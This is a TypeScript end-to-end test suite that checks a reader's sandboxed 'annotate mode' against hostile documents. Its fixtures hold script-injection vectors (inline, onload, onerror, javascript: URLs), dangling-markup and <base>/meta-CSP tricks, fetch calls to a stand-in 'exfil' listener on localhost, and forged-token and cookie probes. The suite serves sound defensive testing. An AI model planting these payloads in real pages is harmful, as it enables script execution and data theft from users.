// F3b1 annotate mode, verified end-to-end in real Chrome: the server mints
// single-use tokens via `POST /api/doc/<docId>/annotate`, serves the document
// under `/f/<cap>/<doc>?annotate=<token>` with a nonce'd annotator script and
// an annotate CSP, and the page's own scripts stay dead. The parent page here
// is the real reader shell — F3b2's reader wiring isn't built yet, so the
// tests do the mount a reader would do: `sandbox="allow-scripts"` set before
// `src`, then a `hr-annotator/hello` message is the only evidence a script ran.
//
// Expiry is asserted at wire level (fake clock — packages/core
// annotate-wire.test.ts): a real `hr serve` offers no clock injection, and a
// 60 s wait has no place in a suite. Everything else the threat model lists
// is exercised here against real Chrome.
//
// Requires real Chrome (puppeteer-core); the whole suite skips without it.

import { createServer, type Server } from "node:http";
import { writeFile } from "node:fs/promises";

import { afterAll, beforeAll, describe, test } from "vitest";

import { assert, assertEq } from "../harness/check.ts";
import { docPath } from "../harness/cli.ts";
import { launchBrowser, type Browser, type Page } from "../harness/chrome.ts";
import { chromeSkipReason, sandbox, type TestHome } from "../harness/env.ts";
import { connect, docApi, type Api } from "../harness/http.ts";
import { killAllTracked } from "../harness/proc.ts";
import { startServe, type Daemon } from "../harness/serve.ts";

const skip = chromeSkipReason();

interface HitLog {
  readonly hits: string[];
  server: Server;
  port: number;
}

/** Miniature "outside world": records every request path it receives. */
const startExtSite = async (): Promise<HitLog> => {
  const hits: string[] = [];
  const server = createServer((req, res) => {
    hits.push(req.url ?? "");
    res.writeHead(200, { "content-type": "text/html" });
    res.end("<title>exfil</title>");
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", resolve);
  });
  const address = server.address();
  assert(typeof address === "object" && address !== null, "external test site failed to start");
  return { hits, server, port: address.port };
};

describe.skipIf(skip !== undefined)("annotate-mode", () => {
  let home: TestHome;
  let daemon: Daemon;
  let api: Api;
  let browser: Browser;
  let page: Page;
  let ext: HitLog;

  const writeDoc = async (name: string, template: string): Promise<void> => {
    await writeFile(
      docPath(home.ws, name),
      template.replaceAll("{{EXT}}", `http://127.0.0.1:${String(ext.port)}`),
      "utf8",
    );
  };

  /** `POST /api/doc/<docId>/annotate` → the frameUrl the iframe gets. */
  const annotate = async (docId: string): Promise<string> => {
    const body = await api.postJson(`${docApi(docId)}/annotate`, {});
    const url = body["frameUrl"];
    assert(typeof url === "string", `annotate reply carries no frameUrl: ${JSON.stringify(body)}`);
    return url;
  };

  const grant = async (docId: string, patch: Record<string, boolean>): Promise<void> => {
    const res = await api.post(`${docApi(docId)}/permissions`, patch);
    assertEq(res.status, 200, `granting ${docId} ${JSON.stringify(patch)} status`);
  };

  /**
   * Mount an annotate frame the way the reader will: the `sandbox` attribute
   * lands before `src` (the flags are sampled at navigation commit), and the
   * set is exactly `allow-scripts` — `allow-same-origin` never appears.
   */
  const mountFrame = async (frameUrl: string): Promise<void> => {
    await page.eval(`(() => {
      const f = document.createElement("iframe");
      f.id = "hr-annotate-probe";
      f.setAttribute("sandbox", "allow-scripts");
      // The frameUrl is a same-origin path — the reader page resolves it.
      f.src = ${JSON.stringify(frameUrl)};
      document.body.appendChild(f);
      return true;
    })()`);
  };

  const msgs = async (): Promise<unknown[]> => {
    const value: unknown = await page.eval(`Array.isArray(window.__pp) ? window.__pp : []`);
    return Array.isArray(value) ? (value as unknown[]) : [];
  };

  const hellos = async (): Promise<number> =>
    (await msgs()).filter(
      (m) => typeof m === "object" && m !== null && Reflect.get(m, "type") === "hr-annotator/hello",
    ).length;

  const texts = async (): Promise<string[]> =>
    (await msgs()).filter((m): m is string => typeof m === "string");

  /** Count-based wait: `__pp` accumulates across tests, so "a hello exists" is not enough. */
  const waitHelloCount = async (expected: number): Promise<void> => {
    const ok = await page.wait(
      `Array.isArray(window.__pp) && window.__pp.filter((m) => m && m.type === "hr-annotator/hello").length >= ${String(expected)}`,
      20_000,
    );
    assert(ok === true, `expected ${String(expected)} hellos, got ${String(await hellos())}`);
  };

  const markerCount = async (marker: string): Promise<number> =>
    (await texts()).filter((m) => m === marker).length;

  const waitMarkerCount = async (marker: string, expected: number): Promise<void> => {
    const ok = await page.wait(
      `Array.isArray(window.__pp) && window.__pp.filter((m) => m === ${JSON.stringify(marker)}).length >= ${String(expected)}`,
      20_000,
    );
    assert(ok === true, `expected ${String(expected)} "${marker}" messages`);
  };

  const sleep = (ms: number): Promise<void> => new Promise((resolve) => setTimeout(resolve, ms));

  beforeAll(async () => {
    home = sandbox("annotate");
    ext = await startExtSite();
    // (a) hostile vectors: every classic script channel, plus network probes.
    await writeDoc(
      "hostile.html",
      `<!doctype html><html><body onload="parent.postMessage('onload-ran','*')">
<script>parent.postMessage('inline-ran','*'); fetch('{{EXT}}/fetch').catch(() => {})</script>
<img src="/no-such.png" onerror="parent.postMessage('onerror-ran','*')">
<iframe src="javascript:parent.postMessage('jsurl-ran','*')"></iframe>
<img src="{{EXT}}/img.png"><script src="{{EXT}}/s.js"></script>
<link rel="stylesheet" href="{{EXT}}/s.css"><form action="{{EXT}}/form"></form>
</body></html>`,
    );
    // (b) dangling-markup attacks: unterminated attrs try to swallow what
    // follows; a meta CSP tries to relax the header policy; <base> tries to
    // re-root the annotator's /f/ URL. The injected tag precedes all of it.
    await writeDoc(
      "dangling.html",
      `<!doctype html><html><head>
<base href="{{EXT}}/base/">
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' *">
</head><body><p>dangling</p>
<img src='{{EXT}}/swallowed?
<script src="{{EXT}}/tail?
`,
    );
    // (e)+(g) a scripts-on document: it can postMessage, and it probes the
    // sandbox's storage/cookie side for us (the annotator shares the sandbox).
    // Chrome partitions opaque-origin storage: localStorage throws outright,
    // while document.cookie gets a private jar — the invariant that matters is
    // that the hReader `hr=` session credential is invisible inside it.
    await writeDoc(
      "live.html",
      `<!doctype html><html><body>
<script>
parent.postMessage('page-ran', '*');
try { localStorage.setItem('x', '1'); parent.postMessage('storage-open', '*'); }
catch (e) { parent.postMessage('storage-blocked', '*'); }
try { document.cookie = 'probe=1'; parent.postMessage(document.cookie.includes('hr=') ? 'cookie-open' : 'cookie-inert', '*'); }
catch (e) { parent.postMessage('cookie-threw', '*'); }
</script></body></html>`,
    );
    // A second foreign doc for the cross-document token check.
    await writeDoc("plain.html", `<!doctype html><html><body><p>plain</p></body></html>`);
    daemon = await startServe({ file: "hostile.html", workspace: home.ws, home: home.home });
    api = await connect(daemon.port, daemon.token);
    browser = await launchBrowser();
    page = await browser.open(daemon.url);
    // The parent-side collector: the reader page is already loaded (cookie
    // bootstrapped), and it never navigates — a plain eval listener suffices.
    await page.eval(`(() => {
      window.__pp = [];
      window.addEventListener('message', (e) => { window.__pp.push(e.data); });
      return true;
    })()`);
  });

  afterAll(async () => {
    await browser.close();
    await daemon.stop();
    ext.server.close();
    await killAllTracked();
    home.cleanup();
  });

  test("(a) scripts off + annotate: only the annotator runs, exactly once", async () => {
    const before = ext.hits.length;
    const helloBefore = await hellos();
    await mountFrame(await annotate("hostile.html"));

    await waitHelloCount(helloBefore + 1);
    await sleep(1_500);

    assertEq(await hellos(), helloBefore + 1, "hello must arrive exactly once");
    for (const marker of ["inline-ran", "onload-ran", "onerror-ran", "jsurl-ran"]) {
      assert(
        !(await texts()).includes(marker),
        `page script channel ${marker} ran under scripts-off + annotate`,
      );
    }
    assertEq(ext.hits.length - before, 0, "a request left the network-off frame");
    // The mounted frame's sandbox carries no same-origin key.
    const attr = await page.eval(
      `document.querySelector('#hr-annotate-probe').getAttribute('sandbox')`,
    );
    assertEq(attr, "allow-scripts", "frame sandbox attr");
  });

  test("(b) dangling markup + meta-CSP + <base> cannot reach the annotator", async () => {
    const before = ext.hits.length;
    const helloBefore = await hellos();
    await mountFrame(await annotate("dangling.html"));

    await waitHelloCount(helloBefore + 1);
    await sleep(1_500);

    assertEq(await hellos(), helloBefore + 1, "hello must arrive once despite the dangling tail");
    assertEq(ext.hits.length - before, 0, "dangling attrs/meta-CSP/base let a request escape");
  });

  test("(c) forged, reused and cross-document tokens all serve the plain doc", async () => {
    // Forged: right shape, wrong value — the response carries no nonce, and
    // the frame never sees a hello.
    const minted = await annotate("plain.html");
    const cap = /\/f\/([A-Za-z0-9_-]{22})\//u.exec(minted)?.[1] ?? "";
    const forged = await fetch(
      `http://127.0.0.1:${String(daemon.port)}/f/${cap}/plain.html?annotate=${"z".repeat(22)}`,
    );
    const forgedBody = await forged.text();
    assertEq(forgedBody.includes("nonce="), false, "forged token still got an injection");
    assertEq(
      forged.headers.get("content-security-policy")?.includes("nonce-") ?? false,
      false,
      "forged token still got a CSP nonce",
    );

    // Reused: consume the minted token once (hello #1), then load it again —
    // the second load is the plain doc, so no second hello can arrive.
    const helloBefore = await hellos();
    await mountFrame(minted);
    await waitHelloCount(helloBefore + 1);
    await mountFrame(minted);
    await sleep(1_200);
    assertEq(await hellos(), helloBefore + 1, "a reused token produced a second annotate load");

    // Cross-document: a token really minted for plain.html, presented on
    // hostile.html's URL — same plain-document answer, no oracle.
    const hostileUrl = await annotate("hostile.html");
    const hostileCap = /\/f\/([A-Za-z0-9_-]{22})\//u.exec(hostileUrl)?.[1] ?? "";
    const plainToken = /annotate=([A-Za-z0-9_-]{22})/u.exec(minted)?.[1] ?? "";
    const cross = await fetch(
      `http://127.0.0.1:${String(daemon.port)}/f/${hostileCap}/hostile.html?annotate=${plainToken}`,
    );
    const crossBody = await cross.text();
    assertEq(crossBody.includes("nonce="), false, "cross-doc token still got an injection");
    // Burning the real plain token on the wrong doc must not have consumed
    // anything for the right doc — minted was already consumed above, so mint
    // a fresh pair for the final proof.
    const again = await annotate("plain.html");
    const againRes = await fetch(`http://127.0.0.1:${String(daemon.port)}${again}`);
    assert((await againRes.text()).includes("nonce="), "fresh annotate load lost its injection");
  });

  test("(d) two annotate loads carry different nonces", async () => {
    const nonces: string[] = [];
    for (let i = 0; i < 2; i += 1) {
      const res = await fetch(
        `http://127.0.0.1:${String(daemon.port)}${await annotate("plain.html")}`,
      );
      const csp = res.headers.get("content-security-policy") ?? "";
      const nonce = /nonce-([A-Za-z0-9_-]{22})/u.exec(csp)?.[1];
      assert(nonce !== undefined, `annotate load ${String(i)} carries no CSP nonce`);
      nonces.push(nonce);
    }
    assert(nonces[0] !== nonces[1], "annotate nonces repeat across loads");
  });

  test("(e) sandbox keeps the opaque origin: storage and cookies stay shut", async () => {
    await grant("live.html", { scripts: true });
    const helloBefore = await hellos();
    const ranBefore = await markerCount("page-ran");
    await mountFrame(await annotate("live.html"));

    await waitMarkerCount("page-ran", ranBefore + 1);
    await waitHelloCount(helloBefore + 1);
    await sleep(600);

    const text = await texts();
    assert(text.includes("storage-blocked"), "localStorage was reachable inside the sandbox");
    assert(
      text.includes("cookie-inert") || text.includes("cookie-threw"),
      `cookie probe missing from markers: ${text.join(",")}`,
    );
    assert(!text.includes("storage-open"), "localStorage was open inside the sandbox");
    assert(!text.includes("cookie-open"), "the sandboxed frame saw the hReader cookie");
    // Same sandbox flags for the annotator — it shares the frame's policy.
    const attr = await page.eval(
      `document.querySelector('#hr-annotate-probe').getAttribute('sandbox')`,
    );
    assert(
      typeof attr === "string" && !attr.includes("allow-same-origin"),
      `sandbox attr gained same-origin: ${String(attr)}`,
    );
  });

  test("(f) network off + annotate: the outside listener sees zero hits", async () => {
    const before = ext.hits.length;
    const helloBefore = await hellos();
    await mountFrame(await annotate("hostile.html"));
    await waitHelloCount(helloBefore + 1);
    await sleep(1_500);
    assertEq(ext.hits.length - before, 0, "network-off annotate frame reached the outside");
  });

  test("(g) scripts on + annotate: page script and annotator both run; CSP is byte-identical", async () => {
    // The annotate-load CSP must equal the normal scripts-on CSP byte for byte;
    // the scripts grant is per-doc and lives inside this test, never on order.
    await grant("live.html", { scripts: true });
    const frameUrl = await annotate("live.html");
    const annotated = await fetch(`http://127.0.0.1:${String(daemon.port)}${frameUrl}`);
    const annotatedCsp = annotated.headers.get("content-security-policy");
    const cap = /\/f\/([A-Za-z0-9_-]{22})\//u.exec(frameUrl)?.[1] ?? "";
    const plain = await fetch(`http://127.0.0.1:${String(daemon.port)}/f/${cap}/live.html`, {
      headers: { cookie: api.cookie },
    });
    assertEq(
      annotatedCsp,
      plain.headers.get("content-security-policy"),
      "annotate scripts-on CSP diverged from the normal row",
    );
    assert(!(annotatedCsp ?? "").includes("nonce-"), "scripts-on annotate CSP gained a nonce");

    // And in the frame both sides of the bargain run.
    const before = await hellos();
    const ranBefore = await markerCount("page-ran");
    await mountFrame(await annotate("live.html"));
    await waitMarkerCount("page-ran", ranBefore + 1);
    await waitHelloCount(before + 1);
    assert((await hellos()) > before, "annotator did not run under scripts-on + annotate");
  });
});
